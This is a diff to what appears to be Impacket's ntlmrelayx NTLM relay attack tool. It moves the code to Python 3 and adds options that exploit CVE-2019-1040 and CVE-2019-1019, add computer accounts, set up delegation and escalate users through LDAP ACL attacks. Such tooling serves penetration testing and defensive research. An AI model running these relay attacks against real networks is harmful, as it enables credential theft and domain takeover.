@@ -36,7 +36,11 @@ import argparse
 import sys
 import logging
 import cmd
-import urllib2
+try:
+    from urllib.request import ProxyHandler, build_opener, Request
+except ImportError:
+    from urllib2 import ProxyHandler, build_opener, Request
+
 import json
 from threading import Thread
 
@@ -47,7 +51,7 @@ from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
 
-RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
+RELAY_SERVERS = []
 
 class MiniShell(cmd.Cmd):
     def __init__(self, relayConfig, threads):
@@ -70,32 +74,32 @@ class MiniShell(cmd.Cmd):
         outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])
 
         # Print header
-        print outputFormat.format(*header)
-        print '  '.join(['-' * itemLen for itemLen in colLen])
+        print(outputFormat.format(*header))
+        print('  '.join(['-' * itemLen for itemLen in colLen]))
 
         # And now the rows
         for row in items:
-            print outputFormat.format(*row)
+            print(outputFormat.format(*row))
 
     def emptyline(self):
         pass
 
     def do_targets(self, line):
         for url in self.relayConfig.target.originalTargets:
-            print url.geturl()
+            print(url.geturl())
         return
 
     def do_socks(self, line):
-        headers = ["Protocol", "Target", "Username", "Port"]
+        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
         url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
         try:
-            proxy_handler = urllib2.ProxyHandler({})
-            opener = urllib2.build_opener(proxy_handler)
-            response = urllib2.Request(url)
+            proxy_handler = ProxyHandler({})
+            opener = build_opener(proxy_handler)
+            response = Request(url)
             r = opener.open(response)
             result = r.read()
             items = json.loads(result)
-        except Exception, e:
+        except Exception as e:
             logging.error("ERROR: %s" % str(e))
         else:
             if len(items) > 0:
@@ -120,8 +124,11 @@ class MiniShell(cmd.Cmd):
             logging.error('Relay servers are already stopped!')
 
     def do_exit(self, line):
-        print "Shutting down, please wait!"
+        print("Shutting down, please wait!")
         return True
+
+    def do_EOF(self, line):
+        return self.do_exit(line)
 
 def start_servers(options, threads):
     for server in RELAY_SERVERS:
@@ -138,7 +145,7 @@ def start_servers(options, threads):
         c.setAttacks(PROTOCOL_ATTACKS)
         c.setLootdir(options.lootdir)
         c.setOutputFile(options.output_file)
-        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.escalate_user)
+        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access)
         c.setMSSQLOptions(options.query)
         c.setInteractive(options.interactive)
         c.setIMAPOptions(options.keyword, options.mailbox, options.all, options.imap_max)
@@ -146,7 +153,14 @@ def start_servers(options, threads):
         c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
         c.setSMB2Support(options.smb2support)
         c.setInterfaceIp(options.interface_ip)
+        c.setExploitOptions(options.remove_mic, options.remove_target)
+        c.setWebDAVOptions(options.serve_image)
 
+        if server is HTTPRelayServer:
+            c.setListeningPort(options.http_port)
+            c.setDomainAccount(options.machine_account, options.machine_hashes, options.domain)
+        elif server is SMBRelayServer:
+            c.setListeningPort(options.smb_port)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
         if server is HTTPRelayServer and options.r is not None:
@@ -179,7 +193,7 @@ if __name__ == '__main__':
 
     # Init the example's logger theme
     logger.init()
-    print version.BANNER
+    print(version.BANNER)
     #Parse arguments
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
                                     "try to relay that connection to specified target(s) system or the original client")
@@ -202,6 +216,13 @@ if __name__ == '__main__':
     parser.add_argument('-ip','--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
                   'bind SMB and HTTP servers',default='')
 
+    serversoptions = parser.add_mutually_exclusive_group()
+    serversoptions.add_argument('--no-smb-server', action='store_true', help='Disables the SMB server')
+    serversoptions.add_argument('--no-http-server', action='store_true', help='Disables the HTTP server')
+
+    parser.add_argument('--smb-port', type=int, help='Port to listen on smb server', default=445)
+    parser.add_argument('--http-port', type=int, help='Port to listen on http server', default=80)
+
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection (HTTP server only)')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
     parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
@@ -221,6 +242,8 @@ if __name__ == '__main__':
     parser.add_argument('-wa','--wpad-auth-num', action='store',help='Prompt for authentication N times for clients without MS16-077 installed '
                                                                    'before serving a WPAD file.')
     parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')
+    parser.add_argument('--remove-mic', action='store_true',help='Remove MIC (exploit CVE-2019-1040)')
+    parser.add_argument('--serve-image', action='store',help='local path of the image that will we returned to clients')
 
     #SMB arguments
     smboptions = parser.add_argument_group("SMB client options")
@@ -237,12 +260,26 @@ if __name__ == '__main__':
     mssqloptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
                         '(can specify multiple)')
 
+    #HTTPS options
+    httpoptions = parser.add_argument_group("HTTP options")
+    httpoptions.add_argument('-machine-account', action='store', required=False,
+                            help='Domain machine account to use when interacting with the domain to grab a session key for '
+                                 'signing, format is domain/machine_name')
+    httpoptions.add_argument('-machine-hashes', action="store", metavar="LMHASH:NTHASH",
+                            help='Domain machine hashes, format is LMHASH:NTHASH')
+    httpoptions.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
+    httpoptions.add_argument('-remove-target', action='store_true', default=False,
+                            help='Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)')
+
     #LDAP options
     ldapoptions = parser.add_argument_group("LDAP client options")
     ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information')
     ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin')
     ldapoptions.add_argument('--no-acl', action='store_false', required=False, help='Disable ACL attacks')
+    ldapoptions.add_argument('--no-validate-privs', action='store_false', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
     ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
+    ldapoptions.add_argument('--add-computer', action='store_true', required=False, help='Attempt to add a new computer account')
+    ldapoptions.add_argument('--delegate-access', action='store_true', required=False, help='Delegate access on relayed computer account to the specified account')
 
     #IMAP options
     imapoptions = parser.add_argument_group("IMAP client options")
@@ -292,8 +329,15 @@ if __name__ == '__main__':
             targetSystem = None
             mode = 'REFLECTION'
 
-    if options.r is not None:
-        logging.info("Running HTTP server in redirect mode")
+    if not options.no_smb_server:
+        RELAY_SERVERS.append(SMBRelayServer)
+
+    if not options.no_http_server:
+        RELAY_SERVERS.append(HTTPRelayServer)
+
+        if options.r is not None:
+            logging.info("Running HTTP server in redirect mode")
+
 
     if targetSystem is not None and options.w:
         watchthread = TargetsFileWatcher(targetSystem)
@@ -312,7 +356,7 @@ if __name__ == '__main__':
 
     c = start_servers(options, threads)
 
-    print ""
+    print("")
     logging.info("Servers started, waiting for connections")
     try:
         if options.socks:
@@ -333,6 +377,3 @@ if __name__ == '__main__':
         del s
 
     sys.exit(0)
-
-
-
